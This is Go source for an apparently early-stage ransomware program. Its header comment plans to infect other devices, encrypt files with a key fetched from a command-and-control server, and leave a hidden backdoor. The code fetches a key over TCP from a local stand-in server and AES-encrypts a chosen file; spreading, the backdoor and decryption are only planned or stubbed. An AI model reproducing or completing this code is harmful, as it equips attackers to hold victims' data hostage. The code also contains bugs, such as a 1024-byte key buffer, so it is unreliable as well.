/*
main logic:
infect all other devs -> enc -> (hidden) backdoor

enc:
get key from c2 -> enc with custom alg -> ret some checksum

*/

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
)

func raw_connect(host string, ports string) string {
	conn, err := net.Dial("tcp", host+":"+ports)
	if err != nil {
		fmt.Println("Connecting error:", err)
	}
	if conn != nil {
		defer conn.Close()
		key := make([]byte, 1024)
		if _, err := conn.Read(key); err == nil {
			return string(key)
		}
	}
	return ""
}

// func enc(key []byte, file string) bool {

// 	plaintext, err := ioutil.ReadFile(file)
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	fmt.Print(key)
// 	block, err := aes.NewCipher(key)
// 	if err != nil {
// 		fmt.Println("error:", err, "\n", block, key)
// 		return false
// 	}

// 	gcm, err := cipher.NewGCM(block)
// 	if err != nil {
// 		fmt.Println("error:", err)
// 		return false
// 	}

// 	nonce := make([]byte, gcm.NonceSize())
// 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
// 		fmt.Println("error:", err)
// 		return false
// 	}

// 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

// 	// Save back to file
// 	err = ioutil.WriteFile(file+".bin", ciphertext, 0777)
// 	if err != nil {
// 		fmt.Println("error:", err)
// 		return false
// 	}
// 	return true
// }

func enc(key string, file string) {
	// read content from your file
	plaintext, err := ioutil.ReadFile(file)
	if err != nil {
		panic(err.Error())
	}

	// this is a key
	print([]byte("example key 1234"))
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	// create a new file for saving the encrypted data.
	f, err := os.Create("a_aes.txt")
	if err != nil {
		panic(err.Error())
	}
	_, err = io.Copy(f, bytes.NewReader(ciphertext))
	if err != nil {
		panic(err.Error())
	}

	// done
}

// func decrypt(key, file) {

// }

func main() {
	file := flag.String("f", "asd.txt", "file to enc")
	flag.Parse()
	// fmt.Println(*file)
	enc_key := raw_connect("localhost", "8000")
	enc(enc_key, *file)
	// decrypt(enc_key)
}
